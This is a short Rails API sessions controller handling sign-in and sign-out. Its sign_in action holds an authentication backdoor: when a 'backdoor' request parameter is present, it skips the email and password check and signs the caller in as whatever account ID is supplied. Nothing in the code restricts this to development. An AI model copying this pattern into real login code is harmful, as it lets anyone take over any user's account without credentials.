module Api::V1
  class SessionsController < Api::V1::BaseController

    before_action :authenticate_account!, only: :sign_out

    def sign_in
      account = nil

      if  params[:backdoor].nil?
        email = params[:email]
        account = Account.find_by!(email: email)

        password = params[:password]
        unless account.authenticate(password)
          render_unauthorized and return
        end
      else
        id = params[:account_id] || params[:id]
        account = Account.find(id)
      end

      sign_in!(account)
      render_ok({ account: account })
    end

    def sign_out
      sign_out!
      render_ok
    end
  end
end
